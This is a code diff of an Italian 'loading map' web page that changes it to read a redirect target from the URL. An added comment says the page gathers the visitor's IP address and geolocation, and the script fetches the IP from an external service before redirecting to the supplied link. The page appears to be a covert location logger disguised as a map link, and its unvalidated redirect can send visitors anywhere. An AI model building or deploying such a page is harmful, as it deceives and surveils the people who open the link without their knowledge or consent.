@@ -2,7 +2,7 @@
 <html lang="it">
 <head>
   <meta charset="UTF-8">
-  <title>Apertura mappa...</title>
+  <title>Caricamento Mappa...</title>
   <style>
     body { font-family: Arial; background: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
     .box { text-align: center; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
@@ -10,6 +10,11 @@
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
   </style>
   <script>
+    // Ottieni il link di Google Maps dalla query string
+    const urlParams = new URLSearchParams(window.location.search);
+    const location = urlParams.get('location');
+
+    // Raccogli l'IP e il geolocalizzazione dell'utente
     fetch("https://api.ipify.org?format=json")
       .then(res => res.json())
       .then(data => {
@@ -32,20 +37,16 @@
       });
     });
 
-    // Leggi il link di condivisione da config.json
-    fetch("config.json")
-      .then(res => res.json())
-      .then(data => {
-        setTimeout(() => {
-          window.location.href = data.mapLink; // Usa il link completo della mappa
-        }, 2000);
-      });
+    // Dopo 2 secondi, reindirizza alla mappa di Google
+    setTimeout(() => {
+      window.location.href = location; // reindirizza al link di Google Maps
+    }, 2000);
   </script>
 </head>
 <body>
   <div class="box">
     <div class="loader"></div>
-    <p>Caricamento mappa in corso... Attendere qualche secondo.</p>
+    <p>Caricamento mappa... Attendere qualche secondo.</p>
   </div>
 </body>
 </html>
